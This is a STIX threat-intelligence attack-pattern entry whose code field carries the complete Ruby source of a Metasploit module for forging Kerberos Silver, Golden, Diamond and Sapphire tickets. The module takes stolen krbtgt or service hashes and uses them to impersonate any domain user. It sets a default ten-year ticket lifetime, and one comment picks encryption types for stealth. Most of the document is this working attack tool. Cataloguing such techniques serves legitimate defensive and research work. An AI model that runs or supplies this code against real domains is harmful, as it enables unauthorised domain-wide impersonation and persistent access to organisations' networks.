{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--376c29b4-0aff-42c3-a9e9-03c693a89a4d",
    "created": "2024-08-14T16:22:57.173817Z",
    "modified": "2024-08-14T16:22:57.173821Z",
    "name": "Kerberos Silver/Golden/Diamond/Sapphire Ticket Forging",
    "description": " This module forges a Kerberos ticket. Four different techniques can be used: - Silver ticket: Using a service account hash, craft a ticket impersonating any user and privileges to that account. - Golden ticket: Using the krbtgt hash, craft a ticket impersonating any user and privileges. - Diamond ticket: Authenticate to the domain controller, and using the krbtgt hash, copy the PAC from the authenticated user to a forged ticket. - Sapphire ticket: Use the S4U2Self+U2U trick to retrieve the PAC of another user, then use the krbtgt hash to craft a forged ticket. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/kerberos/forge_ticket.rb",
            "external_id": "forge_ticket.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Kerberos::Client\n  include Msf::Exploit::Remote::Kerberos::Ticket\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kerberos Silver/Golden/Diamond/Sapphire Ticket Forging',\n        'Description' => %q{\n          This module forges a Kerberos ticket. Four different techniques can be used:\n          - Silver ticket: Using a service account hash, craft a ticket impersonating any user and privileges to that account.\n          - Golden ticket: Using the krbtgt hash, craft a ticket impersonating any user and privileges.\n          - Diamond ticket: Authenticate to the domain controller, and using the krbtgt hash, copy the PAC from the authenticated user to a forged ticket.\n          - Sapphire ticket: Use the S4U2Self+U2U trick to retrieve the PAC of another user, then use the krbtgt hash to craft a forged ticket.\n        },\n        'Author' => [\n          'Benjamin Delpy', # Original Implementation\n          'Dean Welch', # Metasploit Module\n          'alanfoster', # Enhancements\n          'smashery' # Enhancements\n        ],\n        'References' => [\n          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => [],\n          'AKA' => ['Ticketer', 'Klist']\n        },\n        'Actions' => [\n          ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],\n          ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],\n          ['FORGE_DIAMOND', { 'Description' => 'Forge a Diamond Ticket' } ],\n          ['FORGE_SAPPHIRE', { 'Description' => 'Forge a Sapphire Ticket' } ],\n        ],\n        'DefaultAction' => 'FORGE_SILVER'\n      )\n    )\n\n    based_on_real_ticket_condition = ['ACTION', 'in', %w[FORGE_DIAMOND FORGE_SAPPHIRE]]\n    forged_manually_condition = ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN]]\n\n    register_options(\n      [\n        OptString.new('USER', [ true, 'The Domain User to forge the ticket for' ]),\n        OptInt.new('USER_RID', [ true, \"The Domain User's relative identifier (RID)\", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID], conditions: ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN FORGE_DIAMOND]]),\n        OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),\n        OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),\n        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),\n        OptString.new('DOMAIN_SID', [ false, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962'], conditions: forged_manually_condition),\n        OptString.new('EXTRA_SIDS', [ false, 'Extra sids separated by commas, Ex: S-1-5-21-1755879683-3641577184-3486455962-519']),\n        OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], conditions: %w[ACTION == FORGE_SILVER]),\n        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650], conditions: forged_manually_condition),\n        OptString.new('REQUEST_USER', [false, 'The user to request a ticket for, to base the forged ticket on'], conditions: based_on_real_ticket_condition),\n        OptString.new('REQUEST_PASSWORD', [false, \"The user's password, used to retrieve a base ticket\"], conditions: based_on_real_ticket_condition),\n        OptAddress.new('RHOSTS', [false, 'The address of the KDC' ], conditions: based_on_real_ticket_condition),\n        OptInt.new('RPORT', [false, \"The KDC server's port\", 88 ], conditions: based_on_real_ticket_condition),\n        OptInt.new('Timeout', [false, 'The TCP timeout to establish Kerberos connection and read data', 10], conditions: based_on_real_ticket_condition),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SessionKey', [ false, 'The session key, if not set - one will be generated' ], conditions: forged_manually_condition),\n        OptBool.new('IncludeTicketChecksum', [ false, 'Adds the Ticket Checksum to the PAC', false], conditions: forged_manually_condition)\n      ]\n    )\n  end\n\n  SECS_IN_DAY = 60 * 60 * 24\n\n  def run\n    case action.name\n    when 'FORGE_SILVER'\n      forge_silver\n    when 'FORGE_GOLDEN'\n      forge_golden\n    when 'FORGE_DIAMOND'\n      forge_diamond\n    when 'FORGE_SAPPHIRE'\n      forge_sapphire\n    else\n      fail_with(Msf::Module::Failure::BadConfig, \"Invalid action #{action.name}\")\n    end\n  end\n\n  private\n\n  def forge_ccache(sname:, flags:, is_golden:)\n    enc_key, enc_type = get_enc_key_and_type\n\n    start_time = Time.now.utc\n    end_time = start_time + SECS_IN_DAY * datastore['DURATION']\n\n    ccache = forge_ticket(\n      enc_key: enc_key,\n      enc_type: enc_type,\n      start_time: start_time,\n      end_time: end_time,\n      sname: sname,\n      flags: flags,\n      domain: datastore['DOMAIN'],\n      username: datastore['USER'],\n      user_id: datastore['USER_RID'],\n      domain_sid: datastore['DOMAIN_SID'],\n      extra_sids: extra_sids,\n      session_key: datastore['SessionKey'].blank? ? nil : datastore['SessionKey'].strip,\n      ticket_checksum: datastore['IncludeTicketChecksum'],\n      is_golden: is_golden\n    )\n\n    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)\n\n    if datastore['VERBOSE']\n      print_ccache_contents(ccache, key: enc_key)\n    end\n  end\n\n  def forge_silver\n    validate_spn!\n    validate_sid!\n    validate_key!\n    sname = datastore['SPN'].split('/', 2)\n    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgs_flags)\n    forge_ccache(sname: sname, flags: flags, is_golden: false)\n  end\n\n  def forge_golden\n    validate_sid!\n    validate_key!\n    sname = ['krbtgt', datastore['DOMAIN'].upcase]\n    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(tgt_flags)\n    forge_ccache(sname: sname, flags: flags, is_golden: true)\n  end\n\n  def forge_diamond\n    validate_remote\n    validate_aes256_key!\n\n    begin\n      domain = datastore['DOMAIN']\n      options = {\n        server_name: \"krbtgt/#{domain}\",\n        client_name: datastore['REQUEST_USER'],\n        password: datastore['REQUEST_PASSWORD'],\n        realm: domain\n      }\n      enc_key, enc_type = get_enc_key_and_type\n      include_crypto_params(options, enc_key, enc_type)\n\n      tgt_result = send_request_tgt(**options)\n    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e\n      fail_with(Msf::Exploit::Failure::UnexpectedReply, \"Requesting TGT failed: #{e.message}\")\n    rescue Rex::HostUnreachable => e\n      fail_with(Msf::Exploit::Failure::Unreachable, \"Requesting TGT failed: #{e.message}\")\n    end\n\n    if tgt_result.krb_enc_key[:enctype] != enc_type\n      fail_with(Msf::Exploit::Failure::UnexpectedReply, \"Response has incorrect encryption type (#{tgt_result.krb_enc_key[:enctype]})\")\n    end\n\n    begin\n      ticket = modify_ticket(tgt_result.as_rep.ticket, tgt_result.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)\n    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Failed to modify ticket. krbtgt key is likely incorrect')\n    end\n    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])\n\n    if datastore['VERBOSE']\n      print_ccache_contents(ticket, key: enc_key)\n    end\n  end\n\n  def forge_sapphire\n    validate_remote\n    validate_key!\n    options = {}\n    enc_key, enc_type = get_enc_key_and_type\n    include_crypto_params(options, enc_key, enc_type)\n\n    begin\n      auth_context = kerberos_authenticator.authenticate_via_kdc(options)\n    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e\n      fail_with(Msf::Exploit::Failure::UnexpectedReply, \"Error authenticating to KDC: #{e}\")\n    rescue Rex::HostUnreachable => e\n      fail_with(Msf::Exploit::Failure::Unreachable, \"Requesting TGT failed: #{e.message}\")\n    end\n    credential = auth_context[:credential]\n\n    print_status(\"#{peer} - Using U2U to impersonate #{datastore['USER']}@#{datastore['DOMAIN']}\")\n\n    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(\n      type: credential.keyblock.enctype.value,\n      value: credential.keyblock.data.value\n    )\n\n    begin\n      tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])\n    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e\n      fail_with(Msf::Exploit::Failure::UnexpectedReply, \"Error executing S4U2Self+U2U: #{e}\")\n    rescue Rex::HostUnreachable => e\n      fail_with(Msf::Exploit::Failure::Unreachable, \"Error executing S4U2Self+U2U: #{e.message}\")\n    end\n    # Don't pass a user RID in: we'll retrieve it from the decrypted PAC\n    ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], nil, datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)\n    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])\n\n    if datastore['VERBOSE']\n      print_ccache_contents(ticket, key: enc_key)\n    end\n  end\n\n  def validate_remote\n    if datastore['RHOSTS'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify RHOSTS for sapphire and diamond tickets')\n    elsif datastore['REQUEST_USER'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must specify REQUEST_USER for sapphire and diamond tickets')\n    end\n  end\n\n  def kerberos_authenticator\n    options = {\n      host: datastore['RHOST'],\n      realm: datastore['DOMAIN'],\n      timeout: datastore['TIMEOUT'],\n      username: datastore['REQUEST_USER'],\n      password: datastore['REQUEST_PASSWORD'],\n      framework: framework,\n      framework_module: self,\n      ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::None.new\n    }\n\n    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)\n  end\n\n  def include_crypto_params(options, enc_key, enc_type)\n    options[:key] = enc_key\n    if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256\n      # This should be the server's preferred encryption type, so we can just\n      # send our default types, expecting that to be selected. More stealthy this way.\n      options[:offered_etypes] = Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes\n    else\n      options[:offered_etypes] = [enc_type]\n    end\n  end\n\n  def get_enc_key_and_type\n    enc_type = nil\n    key = nil\n    if datastore['NTHASH']\n      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC\n      key = datastore['NTHASH']\n    elsif datastore['AES_KEY']\n      key = datastore['AES_KEY']\n      if datastore['AES_KEY'].size == 64\n        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256\n      else\n        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128\n      end\n    end\n\n    enc_key = key.nil? ? nil : [key].pack('H*')\n    [enc_key, enc_type]\n  end\n\n  def validate_spn!\n    unless datastore['SPN'] =~ %r{.*/.*}\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN, must be in the format <service class>/<host><realm>:<port>/<service name>. Ex: cifs/host.realm.local')\n    end\n  end\n\n  def validate_sid!\n    unless datastore['DOMAIN_SID'] =~ /^S-1-[0-59]-\\d{2}/\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid DOMAIN_SID. Ex: S-1-5-21-1266190811-2419310613-1856291569')\n    end\n  end\n\n  def validate_aes256_key!\n    unless datastore['NTHASH'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (NTHASH is currently set)')\n    end\n\n    if datastore['AES_KEY'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets')\n    end\n\n    if datastore['AES_KEY'].size == 32\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (currently set to an AES128 key)')\n    end\n\n    if datastore['AES_KEY'].size != 64\n      fail_with(Msf::Exploit::Failure::BadConfig, 'Must set an AES256 key for diamond tickets (incorrect length)')\n    end\n  end\n\n  def validate_key!\n    if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')\n    elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH and AES_KEY may not both be set for forging a ticket')\n    end\n\n    if datastore['NTHASH'].present? && datastore['NTHASH'].size != 32\n      fail_with(Msf::Exploit::Failure::BadConfig, \"NTHASH length was #{datastore['NTHASH'].size} should be 32\")\n    end\n\n    if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)\n      fail_with(Msf::Exploit::Failure::BadConfig, \"AES key length was #{datastore['AES_KEY'].size} should be 32 or 64\")\n    end\n\n    if datastore['NTHASH'].present?\n      print_warning('Warning: newer Windows systems may not accept tickets encrypted with RC4_HMAC (NT hash). Consider using AES.')\n    end\n  end\n\n  def extra_sids\n    (datastore['EXTRA_SIDS'] || '').split(',').map(&:strip).reject(&:blank?)\n  end\nend\n"
}